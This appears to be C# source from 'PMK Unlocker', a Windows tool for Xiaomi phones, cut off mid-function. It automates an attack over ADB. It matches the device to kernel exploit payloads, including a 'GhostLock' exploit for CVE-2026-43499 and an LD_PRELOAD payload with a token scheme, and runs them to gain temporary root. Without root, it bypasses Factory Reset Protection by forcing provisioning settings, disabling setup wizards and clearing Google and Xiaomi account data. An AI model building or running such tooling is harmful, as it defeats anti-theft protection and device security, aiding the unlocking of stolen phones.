#nullable disable
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Drawing2D;
using System.Formats.Tar;
using System.Globalization;
using System.IO;
using System.IO.Ports;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Text.Json;
using System.Text.RegularExpressions;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Xml.Linq;
using PMKUnlocker.Qualcomm;
using PMKUnlocker.Spreadtrum;

namespace PMKUnlocker
{
    public partial class Form1
    {
        // - su မရရင်: exploits\manifest.json match → payload push/run (ART-style kernel temp root)
        // - နောက်ဆုံး: MIUI provision/settings + wizard skip (best-effort, no-root path)
        private async void BtnXiaomiTempRootFrp_Click(object sender, EventArgs e)
        {
            string dv = await ExecuteCommandQuickAsync("adb.exe", "devices -l");
            var adbTargets = new List<(string Serial, string Model)>();
            foreach (string raw in dv.Replace("\r", "").Split('\n'))
            {
                string line = raw.Trim();
                if (line.Length == 0 || line.StartsWith("List of devices", StringComparison.OrdinalIgnoreCase)) continue;
                string[] parts = line.Split(' ', StringSplitOptions.RemoveEmptyEntries);
                if (parts.Length < 2 || parts[1] != "device") continue;
                string mdl = "";
                foreach (string p in parts)
                    if (p.StartsWith("model:", StringComparison.Ordinal)) mdl = p.Substring(6).Replace('_', ' ');
                adbTargets.Add((parts[0], mdl));
            }
            if (adbTargets.Count == 0)
            {
                ConfirmDialog.Show("ADB device not found." + Environment.NewLine + Environment.NewLine
                                + "- Developer options > USB debugging ဖွင့်ပါ" + Environment.NewLine
                                + "- Cable ချိတ်ပြီး RSA prompt ကို Allow ပါ",
                    "Xiaomi Temp Root FRP", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                return;
            }
            // MCT-style: model ရွေးစရာမလို — fingerprint auto-match နဲ့ပဲ run
            // (PickTempRootModel = ရှိနေဆဲ, နောက်မှ Model List UI အတွက် ပြန်သုံးနိုင်)
            ExploitEntry pickedEntry = null;
            if (!await PickTempRootDeviceAsync(adbTargets))
            {
                Log("[i] Temp Root cancelled — no device selected.", Color.Orange);
                return;
            }

            // temp-root disconnect guard — run အသစ် start မှာ flag အဟောင်းတွေ reset
            tempRootAborted = false;
            tempRootRecoveryDone = false;
            tempRootReconnectLogged = false;
            tempRootFlowActive = true;

            await LoadDevicePropsAsync();
            string brand = Prop(PropBrandKeys);
            string model = Prop(PropModelKeys);
            string miui = Prop("ro.miui.ui.version.name", "ro.hyperos.ui.version.name", "ro.miui.ui.version.code");
            // getprop dump fail → individual props fallback
            if (string.IsNullOrWhiteSpace(brand) || string.IsNullOrWhiteSpace(model))
            {
                Log("[!] getprop dump empty — retrying individual props...", Color.Orange);
                await Task.Delay(500);
                await LoadDevicePropsAsync();
                brand = Prop(PropBrandKeys);
                model = Prop(PropModelKeys);
                miui = Prop("ro.miui.ui.version.name", "ro.hyperos.ui.version.name", "ro.miui.ui.version.code");
                if (string.IsNullOrWhiteSpace(brand))
                    brand = (await ExecuteCommandQuickAsync("adb.exe", "shell getprop ro.product.brand")).Trim();
                if (string.IsNullOrWhiteSpace(model))
                    model = (await ExecuteCommandQuickAsync("adb.exe", "shell getprop ro.product.model")).Trim();
                if (string.IsNullOrWhiteSpace(miui))
                    miui = (await ExecuteCommandQuickAsync("adb.exe", "shell getprop ro.miui.ui.version.name")).Trim();
            }
            bool looksXiaomi = brand.IndexOf("xiaomi", StringComparison.OrdinalIgnoreCase) >= 0 ||
                               brand.IndexOf("redmi", StringComparison.OrdinalIgnoreCase) >= 0 ||
                               brand.IndexOf("poco", StringComparison.OrdinalIgnoreCase) >= 0 ||
                               !string.IsNullOrWhiteSpace(miui);

            string kernelVer = (await ExecuteCommandQuickAsync("adb.exe", "shell uname -r")).Trim();
            if (string.IsNullOrWhiteSpace(kernelVer) || kernelVer.IndexOf('\n') >= 0)
            {
                string pv = (await ExecuteCommandQuickAsync("adb.exe", "shell cat /proc/version")).Trim();
                Match km = Regex.Match(pv, @"Linux version\s+(\S+)");
                kernelVer = km.Success ? km.Groups[1].Value : "";
            }
            else
            {
                kernelVer = kernelVer.Split('\n')[0].Trim();
            }

            var fp = new DeviceFingerprint
            {
                Brand = brand,
                Model = model,
                Codename = Prop(PropDeviceKeys),
                Android = Prop("ro.build.version.release", "ro.product.build.version.release"),
                Sdk = Prop("ro.build.version.sdk", "ro.product.build.version.sdk"),
                Kernel = kernelVer,
                Patch = Prop("ro.build.version.security_patch", "ro.product.build.version.security_patch"),
                Soc = Prop(PropSocKeys),
                Miui = miui
            };
            if (string.IsNullOrWhiteSpace(fp.Android))
                fp.Android = (await ExecuteCommandQuickAsync("adb.exe", "shell getprop ro.build.version.release")).Trim();
            if (string.IsNullOrWhiteSpace(fp.Kernel) || fp.Kernel.IndexOf('\n') >= 0)
            {
                string u = (await ExecuteCommandQuickAsync("adb.exe", "shell uname -r")).Trim();
                if (!string.IsNullOrWhiteSpace(u)) fp.Kernel = u.Split('\n')[0].Trim();
            }
            if (string.IsNullOrWhiteSpace(fp.Brand) || string.IsNullOrWhiteSpace(fp.Android))
                Log("[!] ADB props incomplete — brand='" + fp.Brand + "' android='" + fp.Android +
                    "' kernel='" + fp.Kernel + "' (device authorized?)", Color.Orange);

            string exploitsRoot = Path.Combine(Application.StartupPath, "exploits");
            string manifestPath = Path.Combine(exploitsRoot, "manifest.json");
            ExploitManifest manifest = KernelExploit.LoadManifest(manifestPath);
            ExploitEntry exploitMatch = KernelExploit.FindMatch(manifest, fp, out string exploitStatus);
            // measured-patched firmware (exploits\patched-kernels.txt) — the kernel clears the stale waiter,
            // so GhostLock's stack write cannot land on it no matter which profile is pushed
            string patchedNote = KernelExploit.PatchedFirmwareNote(exploitsRoot, fp.Kernel);
            bool unsupportedFirmware = exploitMatch != null && patchedNote != null;

            // ရွေးထားတဲ့ model ≠ ချိတ်ထားတဲ့ဖုန်း → ရပ် (Auto = pickedEntry null → ကျော်)
            if (pickedEntry != null &&
                (exploitMatch == null || !string.Equals(exploitMatch.Id, pickedEntry.Id, StringComparison.Ordinal)))
            {
                ConfirmDialog.Show(
                    "ရွေးထားသော model နဲ့ ချိတ်ထားတဲ့ဖုန်း မတူဘူး။" + Environment.NewLine + Environment.NewLine +
                    "ရွေးထားတာ : " + (string.IsNullOrWhiteSpace(pickedEntry.Name) ? pickedEntry.Id : pickedEntry.Name) + Environment.NewLine +
                    "ချိတ်ထားတာ: " + (string.IsNullOrWhiteSpace(model) ? "?" : model) +
                    " (" + (string.IsNullOrWhiteSpace(fp.Codename) ? "?" : fp.Codename) + ")" + Environment.NewLine +
                    "match       : " + exploitStatus + Environment.NewLine + Environment.NewLine +
                    "→ ရွေးထားတဲ့ model နဲ့ တူတဲ့ဖုန်း ချိတ်ပြီး ထပ်နှိပ်ပါ (သို့) Auto ရွေးပြီး ဆက်ပါ)။",
                    "Xiaomi Temp Root", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                return;
            }

            string suId = (await ProbeSuAsync()).Trim();
            bool hasRoot = suId.Contains("uid=0");

            if (!looksXiaomi)
            {
                Log("[!] Device brand='" + brand + "' MIUI='" + miui + "' — not Xiaomi. Generic ADB FRP path will still run.", Color.Orange);
            }

            string mode = hasRoot
                ? "temp root (ready)"
                : unsupportedFirmware
                    ? "unsupported firmware (kernel patched)"
                    : exploitMatch != null
                        ? "kernel exploit → temp root"
                        : "no-root (ADB only)";
            string exploitLine = exploitMatch != null
                ? "Match : " + exploitMatch.Name + (string.IsNullOrWhiteSpace(exploitMatch.Id) ? "" : " (" + exploitMatch.Id + ")")
                : "Match : none";
            if (ConfirmDialog.Show(
                    "Xiaomi Temp Root" + Environment.NewLine + Environment.NewLine +
                    "Model : " + (string.IsNullOrWhiteSpace(model) ? "?" : model) + Environment.NewLine +
                    "Brand : " + (string.IsNullOrWhiteSpace(brand) ? "?" : brand) +
                    (string.IsNullOrWhiteSpace(miui) ? "" : "  ·  MIUI " + miui) + Environment.NewLine +
                    "Kernel: " + (string.IsNullOrWhiteSpace(fp.Android) ? "?" : "Android " + fp.Android) +
                    (string.IsNullOrWhiteSpace(kernelVer) ? "" : "  ·  " + kernelVer) + Environment.NewLine +
                    "Mode  : " + mode + Environment.NewLine +
                    exploitLine + Environment.NewLine + Environment.NewLine +
                    (hasRoot
                        ? "• Temp root ရှိပြီး — FRP မလုပ်ဘူး" + Environment.NewLine +
                          "• ဆက်လုပ်ရန်: FRP Reset (ROOT) ခလုတ်"
                        : unsupportedFirmware
                            ? "• ဒီ firmware ကို GhostLock မထောက်ပံ့ဘူး — kernel မှာ CVE-2026-43499 fix ပါပြီ" + Environment.NewLine +
                              "• " + patchedNote + Environment.NewLine +
                              "• Exploit ကို မစမ်းတော့ဘူး — reboot / profile အသစ်ကလည်း မပြောင်းနိုင်" + Environment.NewLine +
                              "• No-root MIUI path နဲ့ ဆက်မယ်"
                        : exploitMatch != null
                            ? "• su မရ — kernel exploit payload စမ်းမယ် (ART-style)" + Environment.NewLine +
                              "• Root ရရင် ရပ်မယ် — FRP Reset (ROOT) နဲ့ ဆက်" + Environment.NewLine +
                              "• payload မရှိရင် no-root path ကျ"
                            : "• su / exploit မရှိ — MIUI provision + wizard skip (best-effort)" + Environment.NewLine +
                              "• Android 11+ မှာ full FRP အတွက် root/temp root လိုနိုင်") + Environment.NewLine + Environment.NewLine +
                    "ဖုန်းပိုင်ရှင် ခွင့်ပြုချက် ရှိမှ လုပ်ပါ။ ဆက်လုပ်မလား?",
                    "Confirm Xiaomi Temp Root", MessageBoxButtons.YesNo, MessageBoxIcon.Warning) != DialogResult.Yes)
                return;

            Log("═══ Xiaomi Temp Root · " + model + " (" + fp.Codename + ") · " + selectedAdbSerial + " ═══", Color.FromArgb(0, 180, 255));
            // ---- Device info — compact summary (detail တွေအတွက် Read Full Info) ----
            string sel = (await ExecuteCommandQuickAsync("adb.exe", "shell getenforce")).Trim();
            string blLocked = Prop("ro.boot.flash.locked");
            string blState = blLocked == "1" ? "locked" : blLocked == "0" ? "unlocked" : Prop("ro.boot.verifiedbootstate");
            string market = Prop("ro.product.marketname", "ro.product.vendor.marketname");
            string osVer = Prop("ro.build.version.incremental");
            string region = Prop("ro.miui.region", "ro.product.locale.region");
            string soc = Prop("ro.soc.model");
            string board = Prop("ro.board.platform");

            Log("Device: " + brand + (string.IsNullOrWhiteSpace(market) ? "" : " " + market) +
                " · " + osVer + (string.IsNullOrWhiteSpace(region) ? "" : " (" + region + ")") +
                " · A" + fp.Android + "/" + fp.Sdk +
                (string.IsNullOrWhiteSpace(fp.Patch) ? "" : " · patch " + fp.Patch), Color.Gainsboro);
            Log("SoC: " + (string.IsNullOrWhiteSpace(soc) ? Prop("ro.hardware") : soc) +
                (string.IsNullOrWhiteSpace(board) ? "" : " (" + board + ")") +
                " · kernel " + fp.Kernel, Color.Gainsboro);
            Log("State: bootloader " + blState + " · SELinux " + sel +
                " · root " + (hasRoot ? "Success" : "Denied"),
                hasRoot ? Color.LightGreen : Color.Orange);
            Log("Temp Root running — do not unplug or reboot the device.", Color.Orange);

            // Step A: su prompt — screen ပေါ် Allow စောင့် (temp root)
            if (!hasRoot)
            {
                Log("[1/4] adb root + su probe...", Color.Cyan);
                await ExecuteCommandQuickAsync("adb.exe", "root");
                await Task.Delay(800);
                suId = await ProbeSuAsync();
                hasRoot = suId.Contains("uid=0");
                if (hasRoot) Log("[OK] Root obtained via adb root/su: " + suId, Color.LightGreen);
                else Log("[i] No root from adb root/su yet.", Color.Gray);
            }
            else
            {
                Log("[i] Root already present — exploit not needed on this boot", Color.Cyan);
            }

            // Step A1: MobileSea temp root — token-gated payload (GUI မလို, token formula ကိုယ်တိုင် generate)
            double mstSec = -1;
            bool viaMst = false;
            // Android16(zircon/MT6886/5.15.180) — token payload ဒီ combo မှာ မအောင် (~30s ဖြုတ်) → kernel exploit တန်းဆက်
            bool skipToken = exploitMatch != null &&
                             int.TryParse(fp.Sdk, out int sdkNo) && sdkNo >= 36 &&
                             (fp.Codename.IndexOf("zircon", StringComparison.OrdinalIgnoreCase) >= 0 ||
                              fp.Soc.IndexOf("MT6886", StringComparison.OrdinalIgnoreCase) >= 0 ||
                              fp.Kernel.IndexOf("5.15.180", StringComparison.Ordinal) >= 0);
            if (!hasRoot && looksXiaomi && skipToken)
                Log("[2/4] Token path skip — Android16/zircon (token payload unreliable here, ~30s) → going straight to kernel exploit", Color.Cyan);
            if (!hasRoot && looksXiaomi && !skipToken)
            {
                var swMst = Stopwatch.StartNew();
                (bool mstRoot, double mstRealSec) = await TryMstTempRootAsync();
                swMst.Stop();
                if (mstRoot)
                {
                    hasRoot = true;
                    viaMst = true;
                    mstSec = mstRealSec >= 0 ? mstRealSec : swMst.Elapsed.TotalSeconds;
                    suId = await ProbeSuAsync();
                }
            }

            // device ပျောက်ပြီး ပြန်မချိတ်နိုင် → ကျန်တဲ့ steps တွေ မလုပ်တော့ဘူး
            if (tempRootAborted && !hasRoot)
            {
                tempRootFlowActive = false;
                Log("[i] Temp Root flow stopped — device disconnected.", Color.OrangeRed);
                return;
            }

            // Step A2: ART-style kernel exploit (su မရရင် payload စမ်း)
            double exploitSec = -1;
            if (!hasRoot && unsupportedFirmware)
            {
                // measured kernel: remove_waiter() fix present → no stale waiter → the PI write can never land
                Log("[!] UNSUPPORTED FIRMWARE — " + fp.Kernel, Color.OrangeRed);
                Log("    " + patchedNote, Color.Orange);
                Log("[i] GhostLock (CVE-2026-43499) ကို မစမ်းတော့ဘူး — kernel က stale waiter ကို ရှင်းလိုက်လို့ " +
                    "stack write မရောက်နိုင်။", Color.Orange);
                Log("[i] A reboot or a rebuilt GLK1 profile cannot change a patched kernel.", Color.Gray);
                Log("[i] FRP အတွက် no-root path / BROM auth-bypass / vendor tool ကို သုံးပါ။", Color.Gray);
            }
            else if (!hasRoot && exploitMatch != null)
            {
                var swExploit = Stopwatch.StartNew();
                (bool exRoot, double exSec) = await TryKernelExploitAsync(exploitsRoot, exploitMatch, fp);
                swExploit.Stop();
                hasRoot = exRoot;
                // realSec >= 0 → run.log/stdout က actual exploit time (timeout wait မဟုတ်)
                exploitSec = exSec >= 0 ? exSec : swExploit.Elapsed.TotalSeconds;
                if (hasRoot) suId = await ProbeSuAsync();
            }

            if (tempRootAborted && !hasRoot)
            {
                tempRootFlowActive = false;
                Log("[i] Temp Root flow stopped — device disconnected.", Color.OrangeRed);
                return;
            }

            // Root ရရင် summary block ပြပြီး ရပ် — FRP ကို FRP Reset (ROOT) နဲ့ ဆက်လုပ်မယ်
            if (hasRoot)
            {
                string suCtx = "unknown";
                int ci = (suId ?? "").IndexOf("context=", StringComparison.Ordinal);
                if (ci >= 0) suCtx = suId.Substring(ci + 8).Trim();
                bool viaKsu = suCtx.IndexOf("u:r:ksu:s0", StringComparison.OrdinalIgnoreCase) >= 0;
                string exLabel = viaMst || (exploitMatch != null && exploitSec >= 0) ? "PMK root" : "";
                double exSec = viaMst ? mstSec : exploitSec;

                Log("", Color.Gray);
                Log("✅ TEMP ROOT SUCCESSFUL  ·  " + (string.IsNullOrWhiteSpace(model) ? "?" : model) +
                    (string.IsNullOrWhiteSpace(fp.Codename) ? "" : " (" + fp.Codename + ")") +
                    (exLabel.Length > 0 ? "  ·  " + exLabel + " " + exSec.ToString("0.0") + "s" : ""),
                    Color.LightGreen);
                Log("Device: A" + (string.IsNullOrWhiteSpace(fp.Android) ? "?" : fp.Android) +
                    (string.IsNullOrWhiteSpace(fp.Sdk) ? "" : "/" + fp.Sdk) +
                    (string.IsNullOrWhiteSpace(fp.Patch) ? "" : "  ·  patch " + fp.Patch) +
                    "  ·  kernel " + (string.IsNullOrWhiteSpace(fp.Kernel) ? "?" : fp.Kernel), Color.White);
                Log("Root: " + (suId ?? "").Trim() + "  ·  KernelSU " +
                    (viaKsu ? "loaded ✓" : "temp only (gone after reboot)"),
                    viaKsu ? Color.LightGreen : Color.Orange);
                Log("Next: press 🔓 FRP Reset (ROOT)  ·  reboot removes temp root", Color.Orange);
                tempRootFlowActive = false;
                return;
            }

            Log(unsupportedFirmware
                    ? "[4/4] No temp root — firmware unsupported (kernel patched) → No-root MIUI path: provision + wizard skip..."
                    : "[4/4] No temp root → No-root MIUI path: provision + wizard skip...",
                Color.Cyan);

            // Step B: MIUI/Xiaomi provision settings (no-root path only)
            if (!tempRootAborted)
            {
                await ExecuteCommandQuickAsync("adb.exe", "shell settings put secure user_setup_complete 1");
                await ExecuteCommandQuickAsync("adb.exe", "shell settings put global device_provisioned 1");
                await ExecuteCommandQuickAsync("adb.exe",
                    "shell content insert --uri content://settings/secure --bind name:s:user_setup_complete --bind value:s:1");
                await ExecuteCommandQuickAsync("adb.exe",
                    "shell content insert --uri content://settings/global --bind name:s:device_provisioned --bind value:s:1");
                Log("[i] Provision settings sent — values verified at Step E2.", Color.Gray);
            }

            // Step C: setup wizards (Google + MIUI/Xiaomi)
            // pm disable က system pkgs များ — best effort only
            foreach (string pkg in new[] { "com.google.android.setupwizard", "com.android.setupwizard" })
            {
                string outp = (await ExecuteCommandQuickAsync("adb.exe", "shell pm disable-user --user 0 " + pkg)).Trim();
                if (outp.IndexOf("new state: disabled", StringComparison.OrdinalIgnoreCase) >= 0)
                    Log("[OK] " + pkg + " → disabled", Color.LightGreen);
            }

            // Step D: Google/Xiaomi account packages clear
            foreach (string pkg in new[] { "com.google.android.gms", "com.google.android.gsf", "com.xiaomi.account", "com.xiaomi.mipicks" })
            {
                string outp = (await ExecuteCommandQuickAsync("adb.exe", "shell pm clear " + pkg)).Trim();
                if (outp.IndexOf("success", StringComparison.OrdinalIgnoreCase) >= 0)
                    Log("[OK] pm clear " + pkg, Color.LightGreen);
                else if (!string.IsNullOrWhiteSpace(outp))
                    Log("[i] pm clear " + pkg + ": " + outp.Split('\n')[0].Trim(), Color.Gray);
            }

            if (tempRootAborted)
            {
                tempRootFlowActive = false;
                Log("[i] Temp Root flow stopped — device disconnected.", Color.OrangeRed);
                return;
            }

            // Step E2: no-root MIUI path — second space / user provision tricks
            Log("[i] E2: provision verify + second-space attempt...", Color.Orange);
            await ExecuteCommandQuickAsync("adb.exe", "shell am start -a android.intent.action.MAIN -c android.intent.category.HOME");
            string prov = (await ExecuteCommandQuickAsync("adb.exe", "shell settings get global device_provisioned")).Trim();
            string suc = (await ExecuteCommandQuickAsync("adb.exe", "shell settings get secure user_setup_complete")).Trim();
            // တန်ဖိုးနှစ်ခုလုံး blank = device down/ADB fail (settings fail မဟုတ်) → reconnectပြီး re-verify
            if (prov.Length == 0 && suc.Length == 0 && await EnsureTempRootDeviceConnectedAsync())
            {
                prov = (await ExecuteCommandQuickAsync("adb.exe", "shell settings get global device_provisioned")).Trim();
                suc = (await ExecuteCommandQuickAsync("adb.exe", "shell settings get secure user_setup_complete")).Trim();
            }
            Log("[i] verify device_provisioned=" + prov + "  user_setup_complete=" + suc, Color.Gray);

            if (prov == "1" || suc == "1")
                Log("[OK] No-root provision path OK — reboot and check the setup wizard.", Color.LightGreen);
            else if (prov.Length == 0 && suc.Length == 0)
                Log("[!] ADB/device disconnected — provision verify skipped (not a settings failure).", Color.Orange);
            else
            {
Log("[!] Provision settings not applied — Android 11+ MIUI may need temp root (Magisk/su).", Color.Orange);
            Log("[i] Fallback: use 🔓 FRP Reset (ROOT) / EDL firehose erase frp.", Color.Orange);
            }

            // Home ပြန်ပို့
            await ExecuteCommandQuickAsync("adb.exe", "shell input keyevent 3");
            tempRootFlowActive = false;
        }

        // Temp Root model list — manifest ထဲက enabled entry တွေ payload status နဲ့ ရွေးခိုင်း
        // Cancel=true=ပယ် · Entry=null=Auto(match) · Entry!=null=ရွေးထားတဲ့ model
        private (bool Cancel, ExploitEntry Entry) PickTempRootModel(string exploitsRoot)
        {
            ExploitManifest manifest = KernelExploit.LoadManifest(Path.Combine(exploitsRoot, "manifest.json"));
            List<ExploitEntry> entries = manifest.Exploits.Where(e => e.Enabled).ToList();
            if (entries.Count == 0) return (false, null); // list မရှိ → auto flow

            static string KernelShort(string p)
            {
                if (string.IsNullOrWhiteSpace(p)) return "any-kernel";
                string[] parts = p.Split('-');
                return string.Join("-", parts.Take(3));
            }
            static bool Ready(string root, ExploitEntry e) =>
                File.Exists(KernelExploit.PayloadFullPath(root, e)) &&
                e.Companions.All(c => string.IsNullOrWhiteSpace(c) ||
                    File.Exists(KernelExploit.CompanionFullPath(root, e, c)));

            var labels = new List<string>();
            var map = new List<ExploitEntry>();
            var readyFlags = new List<bool>();
            labels.Add("⚡ Auto — ချိတ်ထားတဲ့ဖုန်းအလိုက် အလိုအလျောက် ရွေးမယ် (match)");
            map.Add(null);
            readyFlags.Add(true);
            foreach (ExploitEntry e in entries)
            {
                string models = e.Models.Length > 0
                    ? string.Join(", ", e.Models.Take(2)) + (e.Models.Length > 2 ? " +" + (e.Models.Length - 2) : "")
                    : (string.IsNullOrWhiteSpace(e.Name) ? e.Id : e.Name);
                string cn = e.Codenames.Length > 0 ? e.Codenames[0] : "-";
                string kernel = e.KernelPrefix.Length > 0 ? KernelShort(e.KernelPrefix[0]) : "any-kernel";
                bool rdy = Ready(exploitsRoot, e);
                labels.Add(models + "   ·   " + cn + "   ·   " + kernel +
                            (rdy ? "     ✓ payload အဆင်သင့်" : "     ✗ payload မရှိ"));
                map.Add(e);
                readyFlags.Add(rdy);
            }

            bool dark = !lightTheme;
            Color formBg = dark ? Color.FromArgb(18, 20, 24) : Color.FromArgb(222, 228, 240);
            Color listBg = dark ? Color.FromArgb(26, 29, 35) : Color.FromArgb(243, 246, 252);
            Color listFg = dark ? Color.Gainsboro : Color.FromArgb(35, 38, 48);
            Color titleC = dark ? Color.FromArgb(86, 145, 250) : Color.FromArgb(58, 102, 208);
            Color hintC = dark ? Color.FromArgb(150, 165, 185) : Color.FromArgb(70, 80, 95);
            Color okBg = dark ? Color.FromArgb(86, 145, 250) : Color.FromArgb(58, 102, 208);
            Color cancelBg = dark ? Color.FromArgb(60, 66, 76) : Color.FromArgb(150, 158, 170);
            Color greenC = dark ? Color.FromArgb(0, 220, 140) : Color.FromArgb(0, 130, 70);
            Color redC = dark ? Color.FromArgb(255, 110, 80) : Color.FromArgb(200, 60, 30);
            Color cyanC = dark ? Color.FromArgb(86, 145, 250) : Color.FromArgb(58, 102, 208);

            using var dlg = new Form
            {
                Text = "PMK Unlocker — Temp Root Model List",
                ClientSize = new Size(764, 214),
                FormBorderStyle = FormBorderStyle.FixedDialog,
                StartPosition = FormStartPosition.CenterParent,
                MaximizeBox = false,
                MinimizeBox = false,
                ShowInTaskbar = false,
                BackColor = formBg,
                ForeColor = dark ? Color.White : Color.FromArgb(35, 38, 48),
                Font = new Font("Segoe UI", 9.5f)
            };
            var title = new Label
            {
                Left = 16,
                Top = 12,
                Width = 730,
                Text = "⚙  Temp Root — Model ရွေးပါ",
                ForeColor = titleC,
                Font = new Font("Segoe UI", 11f, FontStyle.Bold)
            };
            var hint = new Label
            {
                Left = 16,
                Top = 40,
                Width = 730,
                Text = "ရွေးထားတဲ့ model နဲ့ ချိတ်ထားတဲ့ဖုန်း တူရမယ်  ·  payload ရှိတဲ့ model စိမ်း၊ မရှိတာ နီ",
                ForeColor = hintC,
                Font = new Font("Segoe UI", 8.5f)
            };
            var list = new ListBox
            {
                Left = 16,
                Top = 66,
                Width = 730,
                Height = 96,
                BorderStyle = BorderStyle.FixedSingle,
                BackColor = listBg,
                ForeColor = listFg,
                DrawMode = DrawMode.OwnerDrawFixed,
                ItemHeight = 24,
                IntegralHeight = false
            };
            foreach (string l in labels) list.Items.Add(l);
            list.SelectedIndex = 0;
            list.DrawItem += (s, e) =>
            {
                if (e.Index < 0) return;
                bool sel = (e.State & DrawItemState.Selected) != 0;
                Color fg = sel ? Color.White
                             : e.Index == 0 ? cyanC
                             : readyFlags[e.Index] ? greenC : redC;
                using (var b = new SolidBrush(sel ? Color.FromArgb(0, 105, 180) : listBg))
                    e.Graphics.FillRectangle(b, e.Bounds);
                if (e.Index == 0 && !sel)
                    using (var b = new SolidBrush(cyanC))
                        e.Graphics.FillRectangle(b, e.Bounds.X, e.Bounds.Y + e.Bounds.Height - 2, e.Bounds.Width, 2);
                using (var fb = new SolidBrush(fg))
                    e.Graphics.DrawString(list.Items[e.Index].ToString(), list.Font, fb, e.Bounds.X + 4, e.Bounds.Y + 4);
                if ((e.State & DrawItemState.Focus) != 0)
                    using (var p = new Pen(Color.FromArgb(86, 145, 250)))
                        e.Graphics.DrawRectangle(p, e.Bounds.X, e.Bounds.Y, e.Bounds.Width - 1, e.Bounds.Height - 1);
            };
            var cancel = new Button
            {
                Text = "✕  မလုပ်တော့",
                Left = 16,
                Top = 172,
                Width = 140,
                Height = 32,
                FlatStyle = FlatStyle.Flat,
                BackColor = cancelBg,
                ForeColor = Color.White,
                DialogResult = DialogResult.Cancel
            };
            cancel.FlatAppearance.BorderSize = 0;
            cancel.FlatAppearance.MouseOverBackColor = dark ? Color.FromArgb(80, 88, 100) : Color.FromArgb(130, 140, 155);
            var ok = new Button
            {
                Text = "✓  ရွေးပြီး ဆက်",
                Left = 600,
                Top = 172,
                Width = 146,
                Height = 32,
                FlatStyle = FlatStyle.Flat,
                BackColor = okBg,
                ForeColor = Color.White,
                DialogResult = DialogResult.OK
            };
            ok.FlatAppearance.BorderSize = 0;
            ok.FlatAppearance.MouseOverBackColor = dark ? Color.FromArgb(0, 145, 235) : Color.FromArgb(0, 115, 180);
            dlg.Controls.AddRange(new Control[] { title, hint, list, cancel, ok });
            dlg.AcceptButton = ok;
            dlg.CancelButton = cancel;
            if (dlg.ShowDialog(this) != DialogResult.OK) return (true, null);

            ExploitEntry picked = map[list.SelectedIndex];
            if (picked == null) return (false, null);
            if (!Ready(exploitsRoot, picked))
            {
                ConfirmDialog.Show("payload မရှိသေးဘူး — " + picked.Payload + Environment.NewLine + Environment.NewLine
                                + "file ထည့်ပြီးမှ ထပ်စမ်းပါ (exploits\\SUPPORTED_MODELS.txt ကြည့်ပါ)။",
                    "Temp Root", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                return (true, null);
            }
            return (false, picked);
        }

        // Temp Root မတိုင်ခင် — ADB ပေါ်က ဖုန်းတွေထဲက တစ်လုံး ရွေးခိုင်းပြီး serial pin (1 လုံး = auto, >1 = dialog)
        private async Task<bool> PickTempRootDeviceAsync(List<(string Serial, string Model)> devices)
        {
            (string Serial, string Model) pick;
            if (devices.Count == 1)
            {
                pick = devices[0];
            }
            else
            {
                using var dlg = new Form
                {
                    Text = "Temp Root — ဘယ်ဖုန်းကို root လုပ်မလဲ?",
                    Width = 490,
                    Height = 170,
                    FormBorderStyle = FormBorderStyle.FixedDialog,
                    StartPosition = FormStartPosition.CenterParent,
                    MaximizeBox = false,
                    MinimizeBox = false
                };
                var label = new Label
                {
                    Left = 15,
                    Top = 12,
                    Width = 450,
                    Text = "ADB ပေါ်မှာ ဖုန်း " + devices.Count + " လုံး ရှိ — Temp Root လုပ်မယ့်ဖုန်း ရွေးပါ:"
                };
                var combo = new ComboBox
                {
                    Left = 15,
                    Top = 36,
                    Width = 445,
                    DropDownStyle = ComboBoxStyle.DropDownList
                };
                foreach (var d in devices)
                    combo.Items.Add((d.Model.Length > 0 ? d.Model : "(model မသိ)") + "   ·   " + d.Serial);
                combo.SelectedIndex = 0;
                var ok = new Button { Text = "ရွေးပြီး ဆက်", Left = 290, Top = 70, Width = 170, DialogResult = DialogResult.OK };
                var cancel = new Button { Text = "မလုပ်တော့", Left = 15, Top = 70, Width = 110, DialogResult = DialogResult.Cancel };
                dlg.Controls.AddRange(new Control[] { label, combo, ok, cancel });
                dlg.AcceptButton = ok;
                dlg.CancelButton = cancel;
                if (dlg.ShowDialog(this) != DialogResult.OK) return false;
                pick = devices[combo.SelectedIndex];
            }
            if (!string.Equals(selectedAdbSerial, pick.Serial, StringComparison.Ordinal))
            {
                selectedAdbSerial = pick.Serial;
                InvalidateAdbDeviceCache();
            }
            return true;
        }

        // su probe — PATH ထဲမှာ su မရှိရင် GhostLock temp-root su client / root helper ကို စမ်း
        // (timeout/retry ဗားရှင်းကို param နဲ့ ခေါ် — bare call က ဒီ wrapper ကိုပဲ ပြန်ရောက်လို့ recursion ဖြစ်)
        // KernelSU su daemon settle — ပထမ pass fail ပြီး error ရှိရင် 2.5s စောင့်ပြီး ထပ်စမ်း၊ uid=0 မရရင်
        // နောက်ဆုံး error text ကို return (caller တွေက Contains("uid=0") နဲ့ပဲ check → "no output" မဟုတ်တော့)
        private async Task<string> ProbeSuAsync()
        {
            string last = "";
            for (int pass = 0; pass < 2; pass++)
            {
                if (pass > 0)
                {
                    if (last.Length == 0) return "";   // su လုံးဝမရှိ — settle မလို
                    await Task.Delay(2500);            // KernelSU/legacy su daemon settle
                }
                foreach (string cmd in new[]
                         {
                             "shell su -c id",
                             "shell /data/local/tmp/su -c id",
                             "shell /data/local/tmp/cve-2026-43499-root -c id"
                         })
                {
                    string s = (await ExecuteCommandQuickAsync("adb.exe", cmd)).Trim();
                    if (s.Contains("uid=0")) return s;
                    if (s.Length > 0) last = s;
                }
            }
            return last;
        }

        // ================= PMK temp root — token-gated payload (no GUI) =================
        // payload ကို /data/local/tmp/.preload.so အဖြစ် push → LD_PRELOAD + MS=<token> နဲ့ id ခေါ်
        // token = AES-256-CBC(pt, key/iv = FNV(ro.serialno) mix) · pt = 84 00 00 00 | epoch_le | K_le  (±120s)
        // verify pass ရင် payload ctor က run_exploit → permissive + su → "MST:Pass!"

        // exploit stdout ထဲက internal trace chatter — log box မှာ မပြတော့ဘူး (file ထဲ ပဲ ကျန်)
        private static bool IsExploitLogNoise(string t)
        {
            string s = t.ToLowerInvariant();
            return s.Contains("slide ") || s.Contains("tracefs") || s.Contains("ksnitch") ||
